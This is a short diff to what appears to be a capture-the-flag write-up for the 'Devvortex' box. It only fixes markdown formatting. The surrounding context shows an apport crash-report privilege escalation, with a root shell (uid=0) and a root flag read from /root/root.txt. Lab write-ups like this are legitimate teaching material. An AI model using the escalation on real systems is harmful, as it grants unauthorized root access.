@@ -460,7 +460,7 @@ k^J
 Problem report file: /tmp/apport.less.2gv7a9ri.apport
 ```
 
-### Then you can use the exploit as explained [here](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) using the newly-generated report:
+Then you can use the exploit as explained [here](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) using the newly-generated report:
 
 ```shell
 # use the exploit
@@ -485,7 +485,7 @@ uid=0(root) gid=0(root) groups=0(root)
 !ccaatt  //rroooott//rroooott..ttxxtt!cat /root/root.txt
 a018baec037ce9a218071e0b308efdc1
 !done  (press RETURN)
-
+```
 
 <figure>
     <img src="devvortex_pwned.png"
